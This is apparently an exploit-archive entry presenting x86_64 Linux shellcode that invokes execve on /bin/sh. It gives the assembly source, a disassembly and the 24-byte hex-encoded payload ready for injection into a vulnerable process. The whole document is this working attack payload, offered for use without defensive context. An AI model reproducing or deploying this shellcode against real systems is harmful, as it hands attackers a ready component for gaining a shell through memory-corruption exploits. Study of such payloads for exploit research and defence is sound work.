;Category: Shellcode
;Title: GNU/Linux x86_64 - execve /bin/sh
;Author: Celal Doğan Duran
;Date: 07/08/2024
;Architecture: Linux x86_64
; Small and reliable shellcode


[SECTION .text]
global _start
_start:
  xor rax, rax
  mov al, 59  
  xor rdi, rdi
  mov rbx,0x68732f2f6e69622f 
  push rdi
  push rbx
  push rsp
  pop rdi
  syscall

   0x0000000000401000 <+0>:	xor    rax,rax
   0x0000000000401003 <+3>:	mov    al,0x3b
   0x0000000000401005 <+5>:	xor    rdi,rdi
   0x0000000000401008 <+8>:	movabs rbx,0x68732f2f6e69622f
   0x0000000000401012 <+18>:	push   rdi
   0x0000000000401013 <+19>:	push   rbx
   0x0000000000401014 <+20>:	push   rsp
   0x0000000000401015 <+21>:	pop    rdi
   0x0000000000401016 <+22>:	syscall


24 Bytes Shellcode 

\x48\x31\xC0\xB0\x3B\x48\x31\xFF\x48\xBB\x2F\x62\x69\x6E\x2F\x2F\x73\x68\x57\x53\x54\x5F\x0F\x05
